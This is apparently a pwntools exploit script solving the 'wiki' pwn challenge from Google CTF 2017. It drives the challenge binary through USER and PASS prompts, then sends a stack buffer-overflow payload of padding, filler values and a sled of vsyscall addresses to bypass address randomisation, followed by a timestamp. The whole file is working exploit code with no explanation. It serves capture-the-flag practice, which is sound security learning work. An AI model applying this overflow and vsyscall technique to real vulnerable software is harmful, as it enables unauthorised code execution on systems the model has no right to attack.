#
# Google CTF 2017 pwn wiki
#

from pwn import *
import time


#r = process('./challenge', aslr=False)
r = process('./challenge')
#gdb.attach(r, '''
#break *0x555555554c52
#'''
#)

r.send('USER\n')
r.send('zomo\n')
r.send('PASS\n')

payload = 'A'*0x88 + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xffffffffff600400)*24
r.send(payload + '\n')

r.send(p64(int(time.time())) + '\n')

print r.recv(1024)
